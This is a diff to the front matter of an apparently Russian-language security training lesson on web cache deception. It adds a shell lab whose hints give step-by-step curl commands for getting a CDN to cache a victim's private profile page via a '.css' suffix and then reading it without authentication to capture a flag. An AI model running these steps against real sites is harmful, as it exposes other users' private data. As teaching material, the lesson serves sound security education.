@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 34
 summary: "Как заставить CDN закэшировать приватную страницу жертвы и затем прочитать её без аутентификации."
+lab:
+  kind: shell
+  title: "Практика: cache deception"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Приватный профиль: `curl -s -i 'http://shop.local/profile/me' -H 'Cookie: session=victim123'` (Cache-Control: private).
+    - Попроси его как статику: `curl -s -i 'http://shop.local/profile/me.css' -H 'Cookie: session=victim123'` — кэш это закэширует.
+    - Прочитай кэш без cookie: `curl -s 'http://shop.local/profile/me.css'`.
+    - Флаг — последняя строка: `curl -s 'http://shop.local/profile/me.css' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
